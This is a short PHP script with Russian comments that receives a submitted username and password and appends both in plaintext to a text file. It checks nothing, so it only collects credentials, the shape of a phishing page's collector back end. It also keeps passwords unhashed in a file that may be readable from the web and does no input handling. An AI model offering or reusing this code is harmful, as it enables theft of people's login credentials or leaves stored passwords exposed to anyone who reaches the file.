<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Здесь вы можете сохранять данные в файл, базу данных или отправлять их по email.
    // Для простоты, сохраним данные в файл.
    
    $file = 'data.txt';
    $current = file_get_contents($file);
    $current .= "Username: $username, Password: $password\n";
    file_put_contents($file, $current);
    
    echo "Data saved!";
}
?>
